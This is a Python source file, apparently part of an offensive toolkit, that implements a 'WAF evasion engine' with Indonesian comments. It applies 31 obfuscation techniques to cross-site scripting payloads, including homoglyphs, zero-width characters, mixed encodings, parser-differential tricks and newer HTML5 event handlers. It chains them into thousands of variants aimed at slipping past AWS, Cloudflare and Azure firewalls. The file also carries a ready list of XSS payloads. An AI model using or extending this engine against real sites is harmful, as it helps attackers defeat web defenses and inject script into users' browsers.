"""
waf_bypass/evasion_v2.py

╔══════════════════════════════════════════════════════════════╗
║   WAF EVASION ENGINE v3 — Updated 2025/2026                  ║
║   31 techniques (was 25 in v2)                               ║
║                                                              ║
║   Combinations per payload:                                  ║
║   Single:  C(31,1) =       31                                ║
║   Pairs:   C(31,2) =      465                                ║
║   Triples: C(31,3) =    4,495                                ║
║   Quads:   C(31,4) =   31,465                                ║
║   TOTAL:   36,456 per payload (×2.4 vs v2)                   ║
║                                                              ║
║   v2 techniques (25 original, kept):                         ║
║   case_shuffle, comment_inject, double_encode, null_byte,    ║
║   tab_substitute, unicode_norm, html_entity, tag_break,      ║
║   event_obfus, slash_insert, homoglyph, zero_width_space,    ║
║   zero_width_joiner, rtl_override, html5_named_refs,         ║
║   svg_use_ref, css_unicode_esc, json_unicode_esc,            ║
║   soft_hyphen, vertical_tab, octal_encode, html_decimal_ent, ║
║   js_template_split, prototype_chain, overlong_utf8          ║
║                                                              ║
║   NEW 2025/2026 techniques (+6):                             ║
║   + parser_differential  (Ethiack Research Sept 2025)        ║
║   + new_event_handler    (Sysdig 2025, PortSwigger Jan 2026) ║
║   + comma_operator_hpp   (Ethiack HPP research 2025)         ║
║   + attribute_breakout   (backtick + control char)           ║
║   + cloudflare_2025      (hackbot discovery, Ethiack 2025)   ║
║   + encoding_smuggling   (mixed encoding ambiguity)          ║
╚══════════════════════════════════════════════════════════════╝
"""

import itertools
import re
import urllib.parse
import random
from typing import List, Tuple, Optional
from utils.logger import debug


class EvasionEngineV2:
    """
    Nama kelas tetap EvasionEngineV2 agar kompatibel dengan semua
    import yang sudah ada di engine_v2.py dan engine_v3.py.
    31 teknik total, 36.456 chain per payload.
    """

    _V1_TECHNIQUES = [
        "case_shuffle", "comment_inject", "double_encode", "null_byte",
        "tab_substitute", "unicode_norm", "html_entity", "tag_break",
        "event_obfus", "slash_insert",
    ]

    _V2_NEW = [
        "homoglyph", "zero_width_space", "zero_width_joiner", "rtl_override",
        "html5_named_refs", "svg_use_ref", "css_unicode_esc", "json_unicode_esc",
        "soft_hyphen", "vertical_tab", "octal_encode", "html_decimal_ent",
        "js_template_split", "prototype_chain", "overlong_utf8",
    ]

    # Teknik baru 2025/2026
    _V3_2025 = [
        "parser_differential",
        "new_event_handler",
        "comma_operator_hpp",
        "attribute_breakout",
        "cloudflare_2025",
        "encoding_smuggling",
    ]

    ALL_TECHNIQUES = _V1_TECHNIQUES + _V2_NEW + _V3_2025  # 31 total

    _HGLYPHS = str.maketrans({
        'a': '\u0251', 'e': '\u0435', 'o': '\u03bf',
        'c': '\u0441', 'p': '\u0440', 'i': '\u0456',
        'A': '\u0391', 'O': '\u039f',
    })

    # Event handler baru HTML5 2025 yang belum di-blacklist WAF
    # Sumber: Sysdig 2025 (onbeforetoggle bypass AWS WAF),
    #         PortSwigger XSS Cheat Sheet Jan 2026
    _NEW_EVENT_HANDLERS_2025 = [
        # onbeforetoggle: bypass AWS WAF (Sysdig Research 2025)
        "<button popovertarget=x>x</button><div id=x popover onbeforetoggle=alert(1)>",
        "<details ontoggle=alert(1) open>",
        "<div popover id=x onbeforetoggle=alert(1)>x</div><button popovertarget=x>click</button>",
        # onanimationcancel (Chrome 120+)
        "<style>@keyframes x{}</style><xss style=animation-name:x onanimationcancel=alert(1)>",
        # onscrollend (Chrome 114+)
        "<xss onscrollend=alert(1) style=overflow:auto;height:50px><br><br><br><br><br></xss>",
        # oncontentvisibilityautostatechange (Chrome 124+)
        "<div style=content-visibility:auto oncontentvisibilityautostatechange=alert(1)>",
        # ontransitioncancel
        "<style>.x{transition:color 1ms}</style><xss class=x ontransitioncancel=alert(1)>",
        # onpageswap / onpagereveal (Page Transition API, Chrome 126+)
        "<body onpageswap=alert(1)>",
        # onpointerrawupdate
        "<div onpointerrawupdate=alert(1)>hover</div>",
        # oncopy
        "<div oncopy=alert(1) style=user-select:all>copy me</div>",
    ]

    @classmethod
    def _apply_single(cls, payload: str, technique: str) -> Optional[str]:
        try:
            # ── v1 ──────────────────────────────────────────────────────────
            if technique == "case_shuffle":
                return "".join(c.upper() if i % 2 == 0 else c.lower()
                               for i, c in enumerate(payload))

            if technique == "comment_inject":
                for kw in ["script", "onerror", "onload", "alert", "iframe", "img", "svg"]:
                    if kw in payload.lower():
                        idx = payload.lower().index(kw)
                        mid = max(1, len(kw) // 2)
                        return payload[:idx+mid] + "<!---->" + payload[idx+mid:]
                return payload

            if technique == "double_encode":
                return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

            if technique == "null_byte":
                result = payload
                for kw in ["script", "alert", "onerror"]:
                    result = result.replace(kw, kw[:3] + "\x00" + kw[3:])
                return result

            if technique == "tab_substitute":
                return payload.replace(" ", "\t")

            if technique == "unicode_norm":
                return payload.replace("alert", "\u0061\u006c\u0065\u0072\u0074")

            if technique == "html_entity":
                return payload.replace("<", "&#60;").replace(">", "&#62;")

            if technique == "tag_break":
                p = payload
                for tag in ["<img", "<svg", "<script", "<iframe", "<body"]:
                    if tag in p.lower():
                        idx = p.lower().index(tag)
                        p = p[:idx+len(tag)] + "/" + p[idx+len(tag):]
                        break
                return p

            if technique == "event_obfus":
                return payload.replace("alert(1)", "window['al'+'ert'](1)")

            if technique == "slash_insert":
                return re.sub(r"(<\w+)", r"\1/", payload, count=1)

            # ── v2 ──────────────────────────────────────────────────────────
            if technique == "homoglyph":
                result = payload
                for kw in ["alert", "script", "onerror", "onload"]:
                    if kw in result:
                        result = result.replace(kw, kw.translate(cls._HGLYPHS))
                return result

            if technique == "zero_width_space":
                result = payload
                for kw in ["script", "alert", "onerror"]:
                    if kw in result.lower():
                        new_kw = "\u200b".join(kw)
                        result = re.sub(re.escape(kw), new_kw, result,
                                        flags=re.IGNORECASE, count=1)
                return result

            if technique == "zero_width_joiner":
                result = payload
                for kw in ["script", "alert"]:
                    if kw in result.lower():
                        new_kw = "\u200d".join(kw)
                        result = re.sub(re.escape(kw), new_kw, result,
                                        flags=re.IGNORECASE, count=1)
                return result

            if technique == "rtl_override":
                result = payload
                for kw in ["alert", "script", "onerror"]:
                    if kw in result.lower():
                        result = re.sub(re.escape(kw), "\u202e" + kw, result,
                                        flags=re.IGNORECASE, count=1)
                        break
                return result

            if technique == "html5_named_refs":
                return (payload
                        .replace("(", "&lpar;").replace(")", "&rpar;")
                        .replace(":", "&colon;").replace("\t", "&Tab;")
                        .replace("\n", "&NewLine;"))

            if technique == "svg_use_ref":
                return f"<svg><use href='javascript:{urllib.parse.quote(payload)}'/></svg>"

            if technique == "css_unicode_esc":
                result = payload
                for kw, replacement in [
                    ("script",  "\\73\\63\\72\\69\\70\\74"),
                    ("alert",   "\\61\\6c\\65\\72\\74"),
                    ("onerror", "\\6f\\6e\\65\\72\\72\\6f\\72"),
                ]:
                    if kw in result.lower():
                        result = re.sub(re.escape(kw), replacement, result,
                                        flags=re.IGNORECASE, count=1)
                return result

            if technique == "json_unicode_esc":
                return "".join(f"\\u{ord(c):04x}" if c in "<>\"'" else c for c in payload)

            if technique == "soft_hyphen":
                result = payload
                for kw in ["script", "alert", "onerror", "onload"]:
                    if kw in result.lower():
                        idx = result.lower().index(kw)
                        mid = len(kw) // 2
                        result = result[:idx+mid] + "\u00ad" + result[idx+mid:]
                        break
                return result

            if technique == "vertical_tab":
                return payload.replace(" ", "\x0b")

            if technique == "octal_encode":
                result = payload
                for kw in ["script", "alert"]:
                    if kw in result:
                        oct_kw = "".join(f"\\{ord(c):o}" for c in kw)
                        result = result.replace(kw, oct_kw, 1)
                return result

            if technique == "html_decimal_ent":
                result = payload
                for kw in ["script", "alert", "onerror"]:
                    if kw in result.lower():
                        ent_kw = "".join(f"&#{ord(c)};" for c in kw)
                        result = re.sub(re.escape(kw), ent_kw, result,
                                        flags=re.IGNORECASE, count=1)
                return result

            if technique == "js_template_split":
                result = payload.replace("alert(1)", "(`al`+`ert`)(1)")
                result = result.replace("alert`1`", "(`al`+`ert`)`1`")
                return result

            if technique == "prototype_chain":
                return payload.replace("alert(1)",
                                       "[].constructor.constructor('alert(1)')()")

            if technique == "overlong_utf8":
                return payload.replace("<", "\xc0\xbc").replace(">", "\xc0\xbe")

            # ── 2025/2026 ────────────────────────────────────────────────────

            if technique == "parser_differential":
                """
                Eksploitasi perbedaan tokenizer WAF vs HTML parser browser.
                Ethiack Research Sept 2025.

                Strategi: sisipkan soft-hyphen (U+00AD) setelah '<' sebelum
                nama tag. Karakter ini tidak terlihat dan dibuang HTML5 parser
                tapi mengganggu WAF pattern matching berbasis teks/regex.
                Juga sisipkan '%' sebelum event handler sebagai gangguan tambahan.
                """
                result = payload
                # Teknik 1: soft-hyphen setelah '<' → WAF baca '<­script' bukan '<script'
                TAG_PAT = re.compile(
                    r"<(/?(?:script|img|svg|iframe|body|input|details|div|span|"
                    r"xss|a|form|button|video|audio|p|table|select|textarea))",
                    re.IGNORECASE
                )
                new_result = TAG_PAT.sub(lambda m: "<­" + m.group(1), result, 1)
                if new_result != result:
                    result = new_result

                # Teknik 2: '%' sebelum event handler nama
                result = re.sub(r"(\s)(on[a-z]+)(=)", r"\1%\2\3", result, count=1)
                return result

            if technique == "new_event_handler":
                """
                Ganti event handler lama dengan event handler HTML5 baru
                yang belum ada di blacklist WAF.

                Sumber:
                - Sysdig 2025: onbeforetoggle bypass AWS WAF default ruleset
                - PortSwigger XSS Cheat Sheet Jan 2026: event handler baru
                  Chrome 114-126+ yang tidak dikenal WAF generasi lama
                """
                result = payload
                replacements = [
                    ("onerror=alert(1)",   "onbeforetoggle=alert(1) popover"),
                    ("onload=alert(1)",    "style=animation-name:x onanimationcancel=alert(1)"),
                    ("onclick=alert(1)",   "onscrollend=alert(1) style=overflow:auto;height:50px"),
                    ("onfocus=alert(1)",   "style=content-visibility:auto oncontentvisibilityautostatechange=alert(1)"),
                    ("onmouseover=alert(1)", "onpointerrawupdate=alert(1)"),
                ]
                for old, new in replacements:
                    if old.lower() in result.lower():
                        result = re.sub(re.escape(old), new, result,
                                        flags=re.IGNORECASE, count=1)
                        break
                # Jika tidak ada match, gunakan template onbeforetoggle
                if result == payload:
                    result = ("<button popovertarget=x>x</button>"
                              "<div id=x popover onbeforetoggle=alert(1)>")
                return result

            if technique == "comma_operator_hpp":
                """
                HPP ASP.NET comma concat + Azure WAF bypass.
                Ethiack Research Sept 2025.
                Hanya apply ke alert(1) yang standalone — tidak di URL scheme
                dan tidak di dalam string argument seperti constructor('alert(1)').
                """
                # Skip URL scheme payloads — tidak relevan untuk comma concat
                if payload.strip().lower().startswith("javascript:"):
                    return payload
                # Skip jika alert(1) ada di dalam string argument (di dalam tanda kutip)
                # Pattern: ada quote character sebelum "alert"
                import re as _reh
                if _reh.search(r"""['"(,]\s*alert\(1\)""", payload):
                    return payload
                # Apply: replace standalone alert(1) → Azure bypass format
                return payload.replace("alert(1)", "';alert(1);//", 1)

            if technique == "attribute_breakout":
                """
                Keluar dari konteks atribut HTML menggunakan karakter
                yang tidak selalu diblokir WAF.

                Variasi 2025:
                - Backtick sebagai quote delimiter (masih lolos WAF yang
                  hanya cek " dan ' sebagai quote character)
                - Newline/carriage return untuk break nama atribut
                - Kombinasi yang memanfaatkan quirk browser tertentu
                """
                result = payload
                # Backtick sebagai delimiter — beberapa WAF tidak check ini
                result = result.replace('"', '`').replace("'", '`')
                # Tambahkan newline sebelum event handler untuk break parsing WAF
                result = re.sub(r"\s(on\w+=)", "\n\\1", result, count=1)
                return result

            if technique == "cloudflare_2025":
                """
                Bypass Cloudflare dan Azure WAF 2025.
                Ethiack hackbot research 2025.
                Urutan replace: spesifik dulu (window.*, constructor chain),
                baru yang general (standalone alert(1)).
                """
                result = payload
                # 1. constructor chain → queueMicrotask (PALING SPESIFIK duluan)
                if "constructor.constructor(" in result:
                    result = result.replace(
                        "[].constructor.constructor('alert(1)')()",
                        "queueMicrotask(Function('alert(1)'))"
                    )
                    result = result.replace(
                        '[].constructor.constructor("alert(1)")()',
                        'queueMicrotask(Function("alert(1)"))'
                    )
                    return result
                # 2. window.alert / window['alert'] → globalThis
                if "window.alert" in result or "window['alert']" in result or 'window["alert"]' in result:
                    result = result.replace("window.alert(1)", "globalThis.alert(1)")
                    result = result.replace("window['alert'](1)", "globalThis['alert'](1)")
                    result = result.replace('window["alert"](1)', 'globalThis["alert"](1)')
                    return result
                # 3. Standalone alert(1) → Azure bypass format
                # Hanya jika tidak di URL scheme dan tidak di dalam argument string
                if "alert(1)" in result:
                    stripped = result.strip().lower()
                    if not stripped.startswith("javascript:"):
                        result = result.replace("alert(1)", "';alert(1);//", 1)
                return result

            if technique == "encoding_smuggling":
                """
                Kombinasi encoding ambigu yang WAF dan browser decode berbeda.

                Teknik: campur URL encoding dan HTML entity untuk karakter
                yang sama — WAF mungkin normalize hanya satu jenis,
                sementara server atau browser normalize keduanya.

                Juga menggunakan tab (%09) sebagai pengganti spasi (%20)
                karena beberapa WAF filter spasi tapi tidak tab.
                """
                result = payload
                # Mixed: < sebagai URL encode, > sebagai HTML entity
                result = result.replace("<", "%3C")
                result = result.replace(">", "&#62;")
                # Tab sebagai pengganti spasi (beberapa WAF hanya check %20)
                result = result.replace(" ", "%09")
                result = result.replace("+", "%09")
                return result

        except Exception as e:
            debug(f"EvasionV2._apply_single [{technique}] error: {e}")

        return payload

    def apply(self, payload: str, waf: Optional[str] = None) -> List[Tuple[str, str]]:
        """Apply semua 31 teknik. Kompatibel dengan v1/v2 .apply() signature.
        FIX: deduplicate output — beberapa teknik bisa identik untuk payload
        tertentu (misal tag_break + slash_insert → '<script/>alert(1)').
        Simpan hanya teknik pertama per output unik untuk efisiensi.
        """
        results = []
        seen: set = set()
        for technique in self.ALL_TECHNIQUES:
            try:
                result = self._apply_single(payload, technique)
                if result and result != payload and result not in seen:
                    seen.add(result)
                    results.append((result, technique))
            except Exception:
                pass
        return results

    def apply_chained(
        self,
        payload: str,
        waf: Optional[str] = None,
        max_chain: int = 4,
        top_n: int = 100,
    ) -> List[Tuple[str, str]]:
        """
        Apply 1-4 chained techniques. 36.456 varian per payload.
        31 + 465 + 4.495 + 31.465 = 36.456
        """
        results = []
        seen    = set()

        def add(p: str, label: str):
            if p and p != payload and p not in seen:
                seen.add(p)
                results.append((p, label))

        for tech in self.ALL_TECHNIQUES:
            v = self._apply_single(payload, tech)
            add(v, tech)

        if max_chain >= 2:
            for t1, t2 in itertools.combinations(self.ALL_TECHNIQUES, 2):
                try:
                    v = self._apply_single(
                        self._apply_single(payload, t1) or payload, t2)
                    add(v, f"{t1}+{t2}")
                except Exception:
                    pass

        if max_chain >= 3:
            for t1, t2, t3 in itertools.combinations(self.ALL_TECHNIQUES, 3):
                try:
                    v1 = self._apply_single(payload, t1) or payload
                    v2 = self._apply_single(v1, t2) or v1
                    v3 = self._apply_single(v2, t3) or v2
                    add(v3, f"{t1}+{t2}+{t3}")
                except Exception:
                    pass
                if len(results) >= top_n * 2:
                    break

        if max_chain >= 4:
            for t1, t2, t3, t4 in itertools.islice(
                itertools.combinations(self.ALL_TECHNIQUES, 4), 5000
            ):
                try:
                    v = payload
                    for t in (t1, t2, t3, t4):
                        v = self._apply_single(v, t) or v
                    add(v, f"{t1}+{t2}+{t3}+{t4}")
                except Exception:
                    pass
                if len(results) >= top_n * 3:
                    break

        return results[:top_n]

    def get_new_event_handler_payloads(self) -> List[str]:
        """Return payload event handler baru 2025. Dipanggil dari engine_v3."""
        return list(self._NEW_EVENT_HANDLERS_2025)

    @property
    def chains_per_payload(self) -> int:
        n = len(self.ALL_TECHNIQUES)  # 31
        return (n + (n*(n-1)//2) + (n*(n-1)*(n-2)//6)
                + (n*(n-1)*(n-2)*(n-3)//24))
        # 31 + 465 + 4495 + 31465 = 36456
